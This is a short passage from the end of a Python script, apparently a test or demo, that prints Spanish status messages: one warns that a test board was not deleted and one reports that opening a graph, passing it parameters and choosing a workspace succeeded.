        time.sleep(0.25)
    else:
        print(f"AVISO: quedo sin borrar el board de prueba {BOARD}")

print("\nOK: abrir un grafo, pasarle parametros y elegir el workspace.")
